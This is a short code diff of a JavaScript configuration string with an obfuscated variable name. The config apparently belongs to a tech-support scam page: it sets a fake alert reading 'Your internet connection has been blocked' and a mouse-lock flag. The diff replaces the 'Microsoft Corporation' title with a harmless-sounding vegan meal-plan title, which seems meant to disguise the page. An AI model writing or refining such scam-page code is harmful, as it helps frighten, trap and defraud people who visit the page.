@@ -1,4 +1,4 @@
-var dfbnhfj = '{"title": "Microsoft Corporation",' +
+var dfbnhfj = '{"title": "30 day vegan meal plan to let you live longer",' +
     '"alertMsg":"<b>Your internet connection has been blocked</b>",' +
     '"mouseLock": "true",' +
     '"selector":"#pagesdfsdfsdf",' +
